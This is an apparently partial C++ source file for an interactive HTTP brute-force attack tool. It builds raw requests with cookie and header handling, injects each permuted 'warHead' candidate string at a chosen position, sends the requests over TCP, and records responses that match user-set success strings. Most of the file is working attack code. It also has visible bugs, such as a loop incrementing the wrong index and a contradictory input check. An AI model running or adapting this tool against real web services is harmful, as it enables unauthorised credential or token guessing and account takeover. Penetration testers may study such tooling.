void help(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
                printf("Available Commands (%ld available)\n", (long)cp->commandCount);
                for(int i=0; i<cp->commandCount; i++){
                        printf("%s\n", cp->commandList[i].c_str());
                }
        printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}
void setStartingBruteLengthCommand(struct CommandPacket *cp){
        printf("Enter a new starting brute length, the current is '%d'\n(~)> ", cp->startingBruteLength);
        cp->startingBruteLength = cp->mod->getUserInputInt();
        cp->permuter._mapperSize = cp->startingBruteLength;
        cp->mod->pSuccess("Starting brute length changed!\n");
}
void setMaxBruteLengthCommand(struct CommandPacket *cp){
        printf("Enter a new max brute length, the current is '%d'\n(~)> ", cp->maxBruteLength);
        cp->maxBruteLength = cp->mod->getUserInputInt();
        printf("[+] Max brute length changed!\n");
}
void modifyPermuteIncrementOrder(struct CommandPacket *cp){
        printf("+++++++++++++++++++++++++++++++++\n");
        for(int i=0; i<cp->maxBruteLength; i++){
                printf("(%d) Order Value : %d\n", i, cp->permuter._mapperIncOrder[i]);
        }
        printf("\n\nEnter the first order id you want swapped.\n(~)> ");
        int a = cp->mod->getUserInputInt();
        printf("\n\nEnter the second order id you want swapped.\n(~)> ");
        int b = cp->mod->getUserInputInt();

        cp->permuter.swapIncrementOrders(a, b);
        for(int i=0; i<cp->maxBruteLength; i++){
                printf("(%d) Order Value : %d\n", i, cp->permuter._mapperIncOrder[i]);
        }
        printf("+++++++++++++++++++++++++++++++++\n");
}
void showRoundValidChars(struct CommandPacket *cp){
        for(int i=0; i<cp->maxBruteLength; i++){
                printf("(%d) Round Valid Chars : %s\n", i, cp->permuter._validCharsArray[i].c_str());
        }
}

void printPermuterFrozenMapper(struct CommandPacket *cp){
        for(int i=0; i<cp->maxBruteLength; i++){
                printf("(%d) Is Round Frozen? || %d\n", i, cp->permuter._mapperFrozen[i]);
        }
}
void setFrozenRounds(struct CommandPacket *cp){
        printf("+++++++++++++++++++++++++++++++++\n");
        if(cp->permuter._mapperFrozen == NULL || cp->permuter._mapperSize <= 0)
                return;

        printPermuterFrozenMapper(cp);
        printf("\n\nWhich round would you like to toggle?\n(~)> ");
        int option = cp->mod->getUserInputInt();
        if(option <= -1 || option >= cp->permuter._mapperSize)
                return;
        if(cp->permuter._mapperFrozen[option] == true)
                cp->permuter._mapperFrozen[option] = false;
        else if(cp->permuter._mapperFrozen[option] == false)
                cp->permuter._mapperFrozen[option] = true;

        printPermuterFrozenMapper(cp);
        cp->mod->pSuccess("Toggled mapper value.\n");
        printf("+++++++++++++++++++++++++++++++++\n");
}
string getSpecialAlphabet(int option){
        switch(option){
                case 0:
                        return "abcdefghijklmnopqrstuvwxyz";
                case 1:
                        return "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                case 2:
                        return "0123456789";
                case 3:
                        return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                case 4:
                        return "abcdefghijklmnopqrstuvwxyz0123456789";
                case 5:
                        return "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                case 6:
                        return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                case 7:
                        return "! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
                case 8:
                        return "0123456789! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
                case 9:
                        return "abcdefghijklmnopqrstuvwxyz! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
                case 10:
                        return "ABCDEFGHIJKLMNOPQRSTUVWXYZ! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
                case 11:
                        return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
                case 12:
                        return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789! ;:'\",<.>/?`~[]\\{}|@#$%^&*()-=_+";
                case 13:
                        return "eariotnslcudpmhgbfywkvxzjq";
                case 14:
                        return "EARIOTNSLCUDPMHGBFYWKVXZJQ";
                default:
                        fprintf(stderr, "[E] Bad valid char option.\n");
                        return "";
        }
}
void modifyRoundValidChars(struct CommandPacket *cp){
        printf("+++++++++++++++++++++++++++++++++\n");
        showRoundValidChars(cp);
        printf("\n\nWhich pattern would you like to change?\n(~)> ");
        int round = cp->mod->getUserInputInt();
        if(round <= -1 || round >= cp->permuter._mapperSize){
                cp->mod->pError("Bad input.\n");
                return;
        }
        printf("******************************\n");
        printf("Available Patterns:\n");
        printf("[0] lowercase alphabet (a-z)\n");
        printf("[1] uppercase alphabet (A-Z)\n");
        printf("[2] numeric alphabet (0-9)\n");
        printf("[3] mix-case alphabet (a-zA-Z)\n");
        printf("[4] lowercase-numeric (a-z0-9)\n");
        printf("[5] uppercase-numeric (A-Z0-9)\n");
        printf("[6] mix-case numeric (a-ZA-Z0-9)\n");
        printf("[7] symbolic alphabet (!-+)\n");
        printf("[8] numeric-stymbolic (0-9!-+)\n");
        printf("[9] lowercase-symbolic (a-z!-+)\n");
        printf("[10] uppercase-symbolic (A-Z!-+)\n");
        printf("[11] mix-case-symbolic (a-zA-Z!-+\n");
        printf("[12] mix-numeric-symbolic (a-zA-Z0-9!-+)\n");
        printf("[13] english most frequent (e-q)\n");
        printf("[14] english most frequent capitol (A-Q)\n");
        printf("[100] custom\n");
        printf("[200] from file\n");
        printf("******************************\n");
        printf("\n(~)> ");

        string filename = "";
        FileSnake fileSnake;
        char *fBuffer = NULL;
        size_t fileSize = -1;

        int option = cp->mod->getUserInputInt();
        int val = 0;
        if(option >= 0 && option <= 14){
                val = option;
                option = 0;
        }
        switch(option){
                case 0:
                        cp->permuter._validCharsArray[round] = getSpecialAlphabet(val);
                        break;
                case 100:
                        printf("Enter a custom string\n(~)> ");
                        cp->permuter._validCharsArray[round] = cp->mod->getUserInput();
                        break;
                case 200:
                        printf("Enter a file\n(~)> ");
                        filename = cp->mod->getUserInput();
                        fileSize = fileSnake.getFileSize(filename);
                        if(fileSize <= 0){
                                cp->mod->pError("Failed to calculate file size.\n");
                                break;
                        }
                        fBuffer = (char *)malloc(sizeof(char) * fileSize);
                        if(fBuffer == NULL){
                                break;
                        }

                        fileSnake.readFile(filename, fBuffer, fileSize);
                        cp->permuter._validCharsArray[round] = "";
                        for(int i=0; i<fileSize; i++)
                                cp->permuter._validCharsArray[round] += fBuffer[i];
                        break;
                default:
                        cp->mod->pError("Bad valid char option.\n");
                        return;
        }
        showRoundValidChars(cp);
        printf("+++++++++++++++++++++++++++++++++\n");
}
string fetchSessionFileLine(string searchString, string fileBuffer){
        if(fileBuffer.find(searchString) == -1){
                return "";
        }

        size_t pos = fileBuffer.find(searchString);
        string grabber = "";
        for(int i=pos; i<fileBuffer.length(); i++){
                if(fileBuffer[i] == '\r' && !(i+1 >=fileBuffer.length()) && fileBuffer[i+1] == '\n'){
                        break;
                }
                grabber += fileBuffer[i];
        }
        return grabber;
}
void loadSessionFromFile(struct CommandPacket *cp){
        FileSnake filesnake;
        string targetFile = cp->sessionFile;
        if(filesnake.fileExists(cp->sessionFile)){
                printf("Would you like to use the pre-existing session file? (n/Y)\n(~)> ");
                string inpt = cp->mod->getUserInput();
                if(inpt == "n" && inpt == "N" && inpt == "no" && inpt == "No"){
                        printf("Enter the file that you'd like to use instead.\n(~)> ");
                        targetFile = cp->mod->getUserInput();
                }
        }else{
                printf("Enter the file that you'd like to use instead.\n(~)> ");
                targetFile = cp->mod->getUserInput();
        }
        if(!filesnake.fileExists(targetFile)){
                cp->mod->pError("file doesn't exist, aborting.\n");
                return;
        }
        size_t fileSize = filesnake.getFileSize(targetFile);
        if(fileSize <= 0){
                cp->mod->pError("target file is empty, aborting.\n");
                return;
        }

        char *seshBuffer = (char*)malloc(sizeof(char)*fileSize);
        filesnake.readFile(targetFile, seshBuffer, fileSize);
        string sesh = seshBuffer;
        string grabber = "";
        char valids[10] = {
                '0', '1', '2', '3', '4',
                '5', '6', '7', '8', '9'
        };

        grabber = fetchSessionFileLine("cp->maxBruteLength", sesh);
        if(grabber != ""){
                int multiplyer = 1;
                cp->maxBruteLength = 0;
                for(int i=grabber.length()-1; i>=strlen("cp->maxBruteLength: "); i--){
                        for(int j=0; j<10; j++){
                                if(grabber[i] == valids[j]){
                                        cp->maxBruteLength += j*multiplyer;
                                        multiplyer *= 10;
                                        break;
                                }
                        }
                }
        }

        grabber = fetchSessionFileLine("cp->startingBruteLength: ", sesh);
        if(grabber != ""){
        int multiplyer = 1;
                cp->startingBruteLength = 0;
                for(int i=grabber.length()-1; i>=strlen("cp->startingBruteLength: "); i--){
                        for(int j=0; j<10; j++){
                                if(grabber[i] == valids[j]){
                                        cp->startingBruteLength += j*multiplyer;
                                        multiplyer *= 10;
                                        break;
                                }
                        }
                }

        }
        grabber = fetchSessionFileLine("cp->hostName: ", sesh);
        if(grabber != ""){
                cp->hostName = "";
                for(int i=strlen("cp->hostName: "); i<grabber.length(); i++){
                        cp->hostName += grabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->ipAddress: ", sesh);
        if(grabber != ""){
                cp->ipAddress = "";
                for(int i=strlen("cp->ipAddress: "); i<grabber.length(); i++){
                        cp->ipAddress += grabber[i];
                }

        }
        grabber = fetchSessionFileLine("cp->portNumber: ", sesh);
        if(grabber != ""){
                int multiplyer = 1;
                cp->portNumber = 0;
                for(int i=grabber.length()-1; i>=strlen("cp->portNumber: "); i--){
                        for(int j=0; j<10; j++){
                                if(grabber[i] == valids[j]){
                                        cp->portNumber += j*multiplyer;
                                        multiplyer *= 10;
                                        break;
                                }
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->method: ", sesh);
        if(grabber != ""){
                cp->method = "";
                for(int i=strlen("cp->method: "); i<grabber.length(); i++){
                        cp->method += grabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->uri: ", sesh);
        if(grabber != ""){
                cp->uri = "";
                for(int i=strlen("cp->uri: "); i<grabber.length(); i++){
                        cp->uri += grabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->httpVersion: ", sesh);
        if(grabber != ""){
                cp->httpVersion = "";
                for(int i=strlen("cp->httpVersion: "); i<grabber.length(); i++){
                        cp->httpVersion += grabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->extraHeadersCount: ", sesh);
        if(grabber != ""){
                int multiplyer = 1;
                cp->extraHeadersCount = 0;
                for(int i=grabber.length()-1; i>=strlen("cp->extraHeadersCount: "); i--){
                        for(int j=0; j<10; j++){
                                if(grabber[i] == valids[j]){
                                        cp->extraHeadersCount += j*multiplyer;
                                                multiplyer *= 10;
                                        break;
                                }
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->extraHeaders: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                int track = 0;
                for(int i=strlen("cp->extraHeaders: "); i<grabber.length(); i++){
                        if(grabber[i] == '\t' && track < HEADERS_MAX){
                                        cp->extraHeaders[track] = tmpGrabber;
                                        track++;
                                        tmpGrabber = "";
                        }else{
                                tmpGrabber += grabber[i];
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->fetchedHeadersCount: ", sesh);
        if(grabber != ""){
                int multiplyer = 1;
                cp->fetchedHeadersCount = 0;
                for(int i=grabber.length()-1; i>=strlen("cp->fetchedHeadersCount: "); i--){
                        for(int j=0; j<10; j++){
                                if(grabber[i] == valids[j]){
                                        cp->fetchedHeadersCount += j*multiplyer;
                                        multiplyer *= 10;
                                        break;
                                }
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->fetchedHeaders: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                int track = 0;
                int innerTrack = 0;
                for(int i=strlen("cp->fetchedHeaders: "); i<grabber.length(); i++){
                        if(grabber[i] == '\t' && track < HEADERS_MAX){
                                string magicGrabber = "";
                                innerTrack = 0;
                                for(int j=0; j<tmpGrabber.length(); i++){
                                        if(tmpGrabber[i] == '\0' && innerTrack < 3){
                                                cp->fetchedHeaders[track][innerTrack] = magicGrabber;
                                                innerTrack++;
                                                magicGrabber = "";
                                        }else{
                                                magicGrabber += tmpGrabber[i];
                                        }
                                }
                                track++;
                                tmpGrabber = "";
                        }else{
                                tmpGrabber += grabber[i];
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->ignoreCookies: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                for(int i=strlen("cp->ignoreCookies: "); i<grabber.length(); i++){
                        tmpGrabber += grabber[i];
                }
                if(tmpGrabber == "false")
                        cp->ignoreCookies = false;
                else
                        cp->ignoreCookies = true;
        }
        grabber = fetchSessionFileLine("cp->fetchCookiesOnce: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                for(int i=strlen("cp->fetchCookiesOnce: "); i<grabber.length(); i++){
                        tmpGrabber += grabber[i];
                }
                if(tmpGrabber == "false")
                        cp->fetchCookiesOnce = false;
                else
                        cp->fetchCookiesOnce = true;
        }
        grabber = fetchSessionFileLine("cp->cookieFetchUri: ", sesh);
        if(grabber != ""){
                cp->cookieFetchUri = "";
                for(int i=strlen("cp->cookieFetchUri: "); i<grabber.length(); i++){
                        cp->cookieFetchUri += grabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->cookies: ", sesh);
        if(grabber != ""){
                cp->cookies = "";
                for(int i=strlen("cp->cookies: "); i<grabber.length(); i++){
                        cp->cookies += grabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->contentLength: ", sesh);
        if(grabber != ""){
                int multiplyer = 1;
                cp->contentLength = 0;
                for(int i=grabber.length()-1; i>=strlen("cp->contentLength: "); i--){
                        for(int j=0; j<10; j++){
                                if(grabber[i] == valids[j]){
                                        cp->contentLength += j*multiplyer;
                                        multiplyer *= 10;
                                        break;
                                }
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->content: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                for(int i=strlen("cp->content: "); i<grabber.length(); i++){
                        tmpGrabber += grabber[i];
                }

                base64Class base64((char *)tmpGrabber.c_str(), tmpGrabber.length());
                base64.decode();
                tmpGrabber = base64.getResult();
                for(int i=0; i<CONTENT_MAX; i++){
                        if(i >= base64.getResultSize())
                                break;
                        cp->content[i] = tmpGrabber[i];
                }
        }
        grabber = fetchSessionFileLine("cp->brutePos: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                int track = 0;
                for(int i=strlen("cp->brutePos: "); i<grabber.length(); i++){
                        if(grabber[i] == '\t' && track < 2){
                                int value = 0;
                                int multiplyer = 1;
                                for(int i=tmpGrabber.length()-1; i>=0; i--){
                                        for(int j=0; j<10; j++){
                                                if(tmpGrabber[i] == valids[j]){
                                                        value += j*multiplyer;
                                                        multiplyer *= 10;
                                                        break;
                                                }
                                        }
                                }
                                cp->brutePos[track]=value;
                                track++;
                                tmpGrabber = "";
                        }else{
                                tmpGrabber += grabber[i];
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->successStrings: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                int track = 0;
                for(int i=strlen("cp->successStrings: "); i<grabber.length(); i++){
                        if(grabber[i] == '\t' && track < 15){
                                        cp->successStrings[track] = tmpGrabber;
                                        track++;
                                        tmpGrabber = "";
                        }else{
                                tmpGrabber += grabber[i];
                        }
                }
        }
        grabber = fetchSessionFileLine("cp->successStringsLogic: ", sesh);
        if(grabber != ""){
                string tmpGrabber = "";
                int track = 0;
                for(int i=strlen("cp->successStringsLogic: "); i<grabber.length(); i++){
                        if(tmpGrabber[i] == '\t' && track < 15){
                                if(grabber == "false")
                                        cp->successStringsLogic[track] = false;
                                else
                                        cp->successStringsLogic[track] = true;
                                track++;
                                tmpGrabber = "";
                        }else{
                                tmpGrabber += grabber[i];
                        }
                }
        }
}

string fetchCookieFromNetBuffer(struct CommandPacket *cp){
        string resultPacket = cp->netBuffer;
        if(resultPacket.find("set-cookie:") == -1 && resultPacket.find("Set-Cookie:") == -1){
                cp->mod->pError("Failed to find cookies.\n");
                return "";
        }

        string ret = "";
        bool executing = true;
        while(executing){
                if(resultPacket.find("set-cookie:") == -1 && resultPacket.find("Set-Cookie:") == -1){
                        executing = false;
                        break;
                }
                string grabber = "";
                size_t setCookiePos = resultPacket.find("set-cookie:");
                if(setCookiePos == -1 || setCookiePos <=0)
                        setCookiePos = resultPacket.find("Set-Cookie:");
                if(setCookiePos == -1 || setCookiePos <=0){
                        cp->mod->pError("Failed to get cookie position.");
                        executing = false;
                        break;
                }

                int endingI = 0;
                int startingI = setCookiePos+strlen("set-cookie:");
                for(int i=startingI; i<resultPacket.length(); i++){
                        if(resultPacket[i] == ';' || resultPacket[i] == '\r' || resultPacket[i] == '\n'){
                                endingI = i;
                                break;
			}
                        grabber += resultPacket[i];
                }
                ret += grabber + ";";
                grabber = "";
                for(int i = endingI; i<resultPacket.length(); i++){
                        grabber += resultPacket[i];
                }
                resultPacket = grabber;
        }
        return ret;
}
string fetchCookieByUri(struct CommandPacket *cp, string targetUri){
        string ret = "";
        NetSnake netSnake;

        string fetchPacket = "";
        fetchPacket += "GET "+targetUri+" "+cp->httpVersion+"\r\n";
        fetchPacket += "Host: "+cp->hostName+"\r\n";
        //fetchPacket += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n";
        //fetchPacket += "Accept-Language: en-US,en;q=0.5\r\n";
        //fetchPacket += "Accept-Encoding: gzip, deflate\r\n";

        fetchPacket += "\r\n";

        memset(cp->netBuffer, 0x00, MAX_NET_BUFFER);
        netSnake.CreateIpClient(cp->ipAddress, cp->portNumber, SNAKE_MODE_TCP);
        netSnake.sendTcpClient(fetchPacket.c_str(), fetchPacket.length());
        netSnake.recvTcpClient(cp->netBuffer, MAX_NET_BUFFER, 0);
        netSnake.closeSocket();
        return fetchCookieFromNetBuffer(cp);
}
string getNetBufferAsString(struct CommandPacket *cp){
        if(cp->netBufferCount <= 0 || cp->netBufferCount > MAX_NET_BUFFER)
                return "";
        string ret = "";
        for(int i=0; i<cp->netBufferCount; i++){
                ret += cp->netBuffer[i];
        }
        return ret;
}
void fetchHeaderByNameAndUri(struct CommandPacket *cp, int index){
        if(index > HEADERS_MAX || index < 0){
                cp->mod->pError("Buffer overflow.\n");
                return;
        }
        string headerName = cp->fetchedHeaders[index][0];
        string targetUri = cp->fetchedHeaders[index][1];

        NetSnake netsnake;

        string request = "";
        request += "GET "+targetUri+" "+cp->httpVersion+"\r\n";
        request += "Host: "+cp->hostName+"\r\n";
        request += "\r\n";

        memset(cp->netBuffer, 0x00, MAX_NET_BUFFER);
        if(netsnake.CreateIpClient(cp->ipAddress, cp->portNumber, SNAKE_MODE_TCP) == false){
                cp->mod->pError("failed to connect to %s"+cp->ipAddress+"\n");
	}
        netsnake.sendTcpClient(request.c_str(), request.length());
        netsnake.recvTcpClient(cp->netBuffer, MAX_NET_BUFFER, 0);
        netsnake.closeSocket();
        cp->netBufferCount = netsnake.recvSize;

        string examine = getNetBufferAsString(cp);
        if(examine.find(headerName) != -1){
                        string grabber = "";
                size_t loc = examine.find(headerName);
                for(int i=loc+headerName.length()+strlen(": "); i<examine.length(); i++){
                        if(examine[i] == '\r' || examine[i] == '\n'){
                                break;
			}
                        grabber += examine[i];
                }
                cp->fetchedHeaders[index][1] = grabber;
                if(cp->fetchedHeaders[index][2] == "pre")
                        cp->fetchedHeaders[index][2] = "good";
                else
                        cp->fetchedHeaders[index][2] = "during";
        }else{
                cp->mod->pError("No header found for '%s"+headerName+"'\n");
        }
}
string generatePayload(struct CommandPacket *cp, string warHead){
        string ret = "";
        int warHeadLoc = cp->brutePos[0] + cp->brutePos[1];
        ret += cp->method + " " + cp->uri + " " + cp->httpVersion + "\r\n";
        ret += "Host: " + cp->hostName + "\r\n";
        for(int i=0; i<HEADERS_MAX; i++){
                if(cp->extraHeaders[i] != ""){
                        ret += cp->extraHeaders[i] + "\r\n";
                }
        }
        if(!cp->ignoreCookies){
                string test = cp->netBuffer;
                if(cp->cookies != "" && cp->fetchCookiesOnce){
                        ret += "Cookie: "+cp->cookies+"\r\n";
                }else if(cp->cookies == "" && cp->fetchCookiesOnce){
                        string h = cp->uri;
                        if(cp->cookieFetchUri != "")
                                h = cp->cookieFetchUri;

                        cp->cookies = fetchCookieByUri(cp, h);
                        if(cp->cookies != "")
                                ret += "Cookie: " + cp->cookies + "\r\n";
                }else if(!cp->fetchCookiesOnce && cp->cookieFetchUri != ""){
                        cp->cookies = fetchCookieByUri(cp, cp->cookieFetchUri);
                        if(cp->cookies != "")
                                ret += "Cookie: " + cp->cookies + "\r\n";
                }else{
                        cp->cookies = fetchCookieByUri(cp, cp->uri);
			if(cp->cookies != "")
                                ret += "Cookie: "+cp->cookies + "\r\n";
                }
        }
        if(cp->fetchedHeadersCount > 0){
                for(int i=0; i<HEADERS_MAX; i++){
                        if(cp->fetchedHeaders[i][0] != "" && cp->fetchedHeaders[i][2] == "good"){
                                ret += cp->fetchedHeaders[i][0] + ": "+cp->fetchedHeaders[i][1] + "\r\n";
                                        continue;
                        }
                        if(cp->fetchedHeaders[i][0] != ""){
                                fetchHeaderByNameAndUri(cp, i);
                                ret += cp->fetchedHeaders[i][0] + ": "+cp->fetchedHeaders[i][1] + "\r\n";
                        }
                }
        }
        if(ret.length() >= warHeadLoc && warHead != ""){
                if(warHeadLoc <= 0){
                        ret = warHead + ret;
                }else if(warHeadLoc >= ret.length()){
                        ret  += warHead;
                }else{
                        string grab = "";
                        for(int i=0; i<warHeadLoc; i++){
                                grab += ret[i];
                        }
                        grab += warHead;

                        for(int i=warHeadLoc; i<ret.length(); i++){
                                grab += ret[i];
				}
                        ret = grab;
                }
        }
        ret += "\r\n";
        return ret;
}
void showConfigs(struct CommandPacket *cp){
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
	printf("-  This section will be set up after the refactor.            -\n");
	printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n");
}
void attackBruteForceCommand(struct CommandPacket *cp){
        showConfigs(cp);

        string resp;
        printf("Would you like to clear the last run's result file? (y/N)\n(~)> ");
        resp = cp->mod->getUserInput();
        if(resp == "y" || resp == "Y" || resp == "yes" || resp == "Yes"){
                FileSnake fs;
                fs.removeFile(cp->resultsFile);
        }

        printf("Does Everything look good to you? (y/N)\n(?)> ");
        resp = cp->mod->getUserInput();
        if(resp != "y" && resp != "Y" && resp != "yes" && resp != "Yes"){
                printf("aborting the attack.\n");
                return;
        }

        /*
         * Attack prep.
         * */
        cp->cookies = "";
        if(!cp->ignoreCookies){
                string h = cp->uri;
                if(cp->cookieFetchUri != "")
                        h = cp->cookieFetchUri;
                cp->cookies = fetchCookieByUri(cp, h);
        }

	/*
         * Begining attack
         * */
        printf("Attack Launching!\n");
        for(int i=cp->startingBruteLength; i<cp->maxBruteLength+1; i++){
                cp->permuter._mapperSize = i;
                cp->permuter.resetMapper();
                printf("\t\tAdjusting payload length to %d\n", i);
                while(cp->permuter._maxIncrement == false){
                        string warHead = "";
                        for(int j=0; j<cp->permuter._mapperSize; j++){
                                warHead += cp->permuter.getValueByI(j);
                        }
                        /* send packet */
                        NetSnake netSnake;
                        memset(cp->netBuffer, 0x00, MAX_NET_BUFFER);
                        cp->netBufferCount = 0;

                        string explosive = generatePayload(cp, warHead);
                        netSnake.CreateIpClient(cp->ipAddress, cp->portNumber, SNAKE_MODE_TCP);
                        netSnake.sendTcpClient(explosive.c_str(), explosive.length());
                        netSnake.recvTcpClient(cp->netBuffer, MAX_NET_BUFFER, 0);
                        netSnake.closeSocket();
                        cp->netBufferCount = netSnake.recvSize;

			/* check validation values */
                        string test = getNetBufferAsString(cp);
                        bool found = false;
                        string successOn = "";
                        for(int j=0; j<cp->successStringsMax; j++){
                                if(!cp->successStringsLogic[j]){
                                        if(cp->successStrings[j] != "" && test.find(cp->successStrings[j]) != -1){
                                                found = true;
                                                successOn = cp->successStrings[j];
                                        }
                                }else{
                                        if(cp->successStrings[j] != "" && test.find(cp->successStrings[j]) == -1){
                                                found = true;
                                                successOn = cp->successStrings[j];
                                        }
                                }
                        }

                        if(found){
                                printf("\332\r [+] %s ~> %s          \n", warHead.c_str(), successOn.c_str());
                                fflush(stdout);
                                string io = "";
                                io += "[+] Found : '" + warHead + "' | "+successOn+"\n";
                                FileSnake snake;
                                snake.writeFileAppend(cp->resultsFile, (char *)io.c_str(), io.length());
                        }else{
                                printf("\332\r %s       \r", warHead.c_str());
                                fflush(stdout);
                        }

			/* handle success / failures */
                        cp->permuter.Increment();
                }
        }
        printf("Attack Completed.\n");
}
void setSuccessStrings(struct CommandPacket *cp){
        for(int i=0; i<cp->successStringsMax; i++){
                printf("(%d) Success String : %s || Invert Logic (%d)\n", i, cp->successStrings[i].c_str(), cp->successStringsLogic[i]);
        }
        printf("pick a success string to set:\n(~)> ");
        int option = cp->mod->getUserInputInt();
        if(option >= 0 && option < cp->successStringsMax){
                printf("set new success string value.\n(~)> ");
                cp->successStrings[option] = cp->mod->getUserInput();
                printf("Invert validation logic? (yes/no)\n(~)> ");
                string ipt = cp->mod->getUserInput();
                if(ipt == "yes"){
                        cp->successStringsLogic[option] = true;
                }else{
                        cp->successStringsLogic[option] = false;
                }

        }else{
                cp->mod->pError("Invalid success string id.\n");
        }
}

void setSessionFile(struct CommandPacket *cp){
        printf("Please set a new session file location, the current is : '%s'\n(~)> ", cp->sessionFile.c_str());
        cp->sessionFile = cp->mod->getUserInput();
}
void deleteSessionFile(struct CommandPacket *cp){
        if(cp->sessionFile == ""){
                printf("No session file set.\n");
                return;
        }
        if(unlink(cp->sessionFile.c_str()) != 0){
                fprintf(stderr, "[E] Failed to delete session file.\n");
        }else{
                printf("Successfully removed session file\n");
        }
}

void setValidCharsCommand(struct CommandPacket *cp){
        printf("******************************\n");
        printf("Available Patterns:\n");
        printf("[0] lowercase alphabet (a-z)\n");
        printf("[1] uppercase alphabet (A-Z)\n");
        printf("[2] numeric alphabet (0-9)\n");
        printf("[3] mix-case alphabet (a-zA-Z)\n");
        printf("[4] lowercase-numeric (a-z0-9)\n");
        printf("[5] uppercase-numeric (A-Z0-9)\n");
        printf("[6] mix-case numeric (a-ZA-Z0-9)\n");
        printf("[7] symbolic alphabet (!-+)\n");
        printf("[8] numeric-stymbolic (0-9!-+)\n");
        printf("[9] lowercase-symbolic (a-z!-+)\n");
        printf("[10] uppercase-symbolic (A-Z!-+)\n");
        printf("[11] mix-case-symbolic (a-zA-Z!-+\n");
        printf("[12] mix-numeric-symbolic (a-zA-Z0-9!-+)\n");
        printf("[13] english most frequent (e-q)\n");
        printf("[14] english most frequent capitol (A-Q)\n");
        printf("[100] custom\n");
        printf("[200] from file\n");
        printf("******************************\n");
        printf("\n(~)> ");

        string filename = "";
        FileSnake fileSnake;
        char *fBuffer = NULL;
        size_t fileSize = -1;
        int option = cp->mod->getUserInputInt();
        int val = 0;
        if(option >= 0 && option <= 14){
                val = option;
                option = 0;
        }
        switch(option){
                case 0:
                        cp->permuter._validChars = getSpecialAlphabet(val);
                        break;
                case 100:
                        printf("Enter a custom string\n(~)> ");
                        cp->permuter._validChars = cp->mod->getUserInput();
                        break;
                case 200:
                        printf("Enter a file\n(~)> ");
                        filename = cp->mod->getUserInput();
                        fileSize = fileSnake.getFileSize(filename);
                        if(fileSize <= 0){
                                fprintf(stderr, "[E] Failed to calculate file size.\n");
                                break;
                        }

                        fBuffer = (char *)malloc(sizeof(char) * fileSize);
                        if(fBuffer == NULL){
                                break;
                        }
                        fileSnake.readFile(filename, fBuffer, fileSize);
                        cp->permuter._validChars = "";
                        for(int i=0; i<fileSize; i++)
                                cp->permuter._validChars += fBuffer[i];
                        break;
                default:
                        fprintf(stderr, "[E] Bad valid char option.\n");
                        return;
        }
        cp->permuter.initValidCharMap();
        cp->mod->pSuccess("[+] Valid chars changed!\n");
}
void showContent(struct CommandPacket *cp){
	int a = cp->contentLength;
	if(cp->contentLength > CONTENT_MAX)
		a = CONTENT_MAX;
	if(a <= 0){
		memset(cp->content, 0x00, CONTENT_MAX);
		return;
	}
	for(int i=0; i<a; i++){
		printf("%c", cp->content[i]);
	}
}
void setContent(struct CommandPacket *cp){
	printf("How would you like to set content to send?\n");
	printf("[0] from file\n");
	printf("[1] my keyboard\n");
	printf("(~)> ");
	int option = cp->mod->getUserInputInt();
	if(option == 0){
		printf("What's the absolute path to the file?\n(~)> ");
		string inpt = cp->mod->getUserInput();
		if(inpt == ""){
			printf("No path given, aborting.\n");
			memset(cp->content, 0, CONTENT_MAX);
			cp->contentLength = -1;
			return;
		}
		FileSnake fileSnake;
		memset(cp->content, 0, CONTENT_MAX);
		if(fileSnake.readFile(inpt, cp->content, CONTENT_MAX) == false){
			cp->mod->pError("Failed to read from file.\n");
		}
		cp->contentLength = fileSnake.recentActivity;
		cp->mod->pSuccess("Content set.\n");
	}else if(option == 1){
		printf("What would you like to set the content to?\n(~)> ");
		string inpt = cp->mod->getUserInput();
		if(inpt == ""){
			printf("No path given, aborting.\n");
			memset(cp->content, 0, CONTENT_MAX);
			cp->contentLength = -1;
			return;
		}
		int a=0;
		if(inpt.length() > CONTENT_MAX)
			a = CONTENT_MAX;
		else
			a = inpt.length();
		for(int i=0; i<a; i++){
			cp->content[i] = inpt[i];
		}
		cp->contentLength = a;
	}else{
		cp->mod->pError("Invalid input option\n");
	}
}

